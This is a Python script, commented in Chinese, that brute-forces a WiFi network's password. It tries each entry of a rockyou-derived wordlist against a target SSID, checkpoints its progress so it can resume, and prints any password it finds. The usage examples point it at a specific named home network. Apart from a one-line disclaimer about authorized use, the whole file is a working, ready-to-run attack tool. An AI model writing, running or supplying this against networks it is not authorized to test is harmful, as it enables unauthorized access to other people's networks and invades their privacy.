"""wifi_dict_test.py — 用密碼字典測試 WiFi 連線（支援中斷續傳）

Usage:
    # 用預設字典 (rockyou_wpa.txt) 測試
    uv run python tools/wifi_dict_test.py --ssid "ASUS_chenfamily"

    # 指定字典檔
    uv run python tools/wifi_dict_test.py --ssid "ASUS_chenfamily" --wordlist tools/wordlists/rockyou_wpa.txt

    # 調整每次連線等待時間與嘗試間隔
    uv run python tools/wifi_dict_test.py --ssid "ASUS_chenfamily" --timeout 20 --delay 2

Notes:
    - 每次嘗試後自動儲存斷點 (tools/<SSID>_checkpoint.json)
    - 下次執行自動從上次中斷位置繼續
    - 連線失敗時自動刪除剛加入的 profile，保持系統乾淨
    - 此工具僅供對自己擁有或被授權測試的網路使用
"""

import argparse
import json
import sys
import time
from pathlib import Path

# 從同目錄的 wifi_connect.py 匯入 helper 函式（Python 自動將腳本目錄加入 sys.path）
import wifi_connect as _wc

DEFAULT_WORDLIST = Path(__file__).parent / "wordlists" / "rockyou_wpa.txt"
CHECKPOINT_DIR   = Path(__file__).parent


# ---------------------------------------------------------------------------
# Checkpoint
# ---------------------------------------------------------------------------

def _checkpoint_path(ssid: str) -> Path:
    safe = ssid.replace("/", "_").replace("\\", "_").replace(":", "_")
    return CHECKPOINT_DIR / f"{safe}_checkpoint.json"


def _load_checkpoint(ssid: str) -> dict:
    cp = _checkpoint_path(ssid)
    if cp.exists():
        with open(cp, encoding="utf-8") as f:
            return json.load(f)
    return {"ssid": ssid, "tried_index": 0, "found_password": None}


def _save_checkpoint(ssid: str, tried_index: int, found_password=None) -> None:
    data = {
        "ssid": ssid,
        "tried_index": tried_index,
        "found_password": found_password,
    }
    with open(_checkpoint_path(ssid), "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        description="WiFi 密碼字典測試（支援中斷續傳）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--ssid",      required=True,             help="目標 WiFi SSID")
    parser.add_argument("--wordlist",  type=Path, default=DEFAULT_WORDLIST,
                        help=f"密碼字典路徑 (預設: {DEFAULT_WORDLIST})")
    parser.add_argument("--interface", default=None,              help="無線介面卡名稱（預設自動偵測）")
    parser.add_argument("--timeout",   type=int,   default=20,    help="每次連線等待秒數 (預設 20)")
    parser.add_argument("--delay",     type=float, default=3.0,   help="每次嘗試後間隔秒數 (預設 3)")
    parser.add_argument("--reset",     action="store_true",       help="清除既有斷點，從頭開始")
    args = parser.parse_args()

    # ── 字典存在檢查 ──────────────────────────────────────────────────────────
    if not args.wordlist.exists():
        print(f"[ERROR] 字典不存在: {args.wordlist}", file=sys.stderr)
        print("請先執行: uv run python tools/download_wordlist.py", file=sys.stderr)
        return 1

    # ── 偵測介面卡 ────────────────────────────────────────────────────────────
    interface = args.interface
    if not interface:
        interfaces = _wc._get_interfaces()
        if not interfaces:
            print("[ERROR] 找不到無線網路介面卡，請確認 Wi-Fi 已開啟。", file=sys.stderr)
            return 1
        interface = interfaces[0]

    # ── 字典總行數（用於進度百分比） ──────────────────────────────────────────
    print("[INFO] 計算字典大小 ...", end="", flush=True)
    total_lines = sum(1 for _ in open(args.wordlist, "rb"))
    print(f"\r[INFO] 字典共 {total_lines:,} 筆密碼")

    # ── 載入/重置斷點 ─────────────────────────────────────────────────────────
    if args.reset:
        _checkpoint_path(args.ssid).unlink(missing_ok=True)
    cp = _load_checkpoint(args.ssid)
    start_idx = cp["tried_index"]

    if cp["found_password"]:
        print(f"[INFO] 斷點記錄已找到密碼: {cp['found_password']!r}")
        print("如需重新測試請加 --reset 參數。")
        return 0

    print(f"[INFO] SSID    : {args.ssid!r}")
    print(f"[INFO] 字典    : {args.wordlist.name}  ({total_lines:,} 筆)")
    print(f"[INFO] 介面卡  : {interface!r}")
    print(f"[INFO] Timeout : {args.timeout}s / 間隔 {args.delay}s")
    if start_idx > 0:
        print(f"[INFO] 從斷點續傳，跳過前 {start_idx:,} 筆 ...")
    print()

    found     : str | None = None
    tried     : int        = 0

    try:
        with open(args.wordlist, "r", encoding="utf-8", errors="replace") as f:
            for idx, line in enumerate(f):
                if idx < start_idx:
                    continue

                password = line.rstrip("\r\n")
                if not password:
                    _save_checkpoint(args.ssid, idx + 1)
                    continue

                pct = (idx + 1) / total_lines * 100
                print(
                    f"\r[{idx+1:>8,}/{total_lines:,}  {pct:5.1f}%]  {password:<32}",
                    end="", flush=True,
                )

                # 加入 profile
                if not _wc._add_profile(args.ssid, password, interface):
                    tried += 1
                    _save_checkpoint(args.ssid, idx + 1)
                    time.sleep(args.delay)
                    continue

                # 嘗試連線
                connected = _wc._wait_for_connection(args.ssid, interface, args.timeout)

                if connected:
                    found = password
                    print(f"\n\n[FOUND] 密碼: {password!r}")
                    _save_checkpoint(args.ssid, idx + 1, found_password=password)
                    break
                else:
                    _wc._delete_profile(args.ssid, interface)
                    tried += 1
                    _save_checkpoint(args.ssid, idx + 1)
                    time.sleep(args.delay)

    except KeyboardInterrupt:
        print(f"\n\n[中斷] 已嘗試 {tried:,} 筆，斷點已儲存於 {_checkpoint_path(args.ssid).name}")
        return 1

    print()
    if found:
        print(f"[OK] 成功！密碼為: {found!r}")
        return 0

    print(f"[NOT FOUND] 字典耗盡，共嘗試 {tried:,} 筆，未找到密碼。")
    return 1


if __name__ == "__main__":
    sys.exit(main())
